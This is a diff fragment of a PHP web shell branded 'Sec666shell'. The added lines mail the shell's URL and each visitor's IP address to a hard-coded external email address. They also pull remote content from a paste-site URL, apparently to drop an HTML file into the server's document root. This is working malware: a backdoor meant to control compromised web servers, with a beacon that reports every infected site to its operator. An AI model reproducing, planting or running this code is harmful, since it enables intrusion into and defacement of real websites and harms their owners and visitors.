@@ -16,9 +16,17 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 </style>
 </head>
 <center><br><h1 style="font-family: Calligraffitti;"><font color="white">Sec666shell</font></h1></center><table width="700" border="0" cellpadding="3" cellspacing="1" align="center"><br>
+
+#MyServer
 <?php
 set_time_limit(0);
 error_reporting(0);
+$boss = 'zsec@gmx.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$ip = "akses : { $x_path } | IP Address : { " . $_SERVER['REMOTE_ADDR'] . " }";
+mail($boss, "Sec666shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
+$check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
+$text3 = file_get_contents('https://ghostbin.co/paste/shjro/raw');
 
 #function
 function ambilKata($param, $kata1, $kata2){
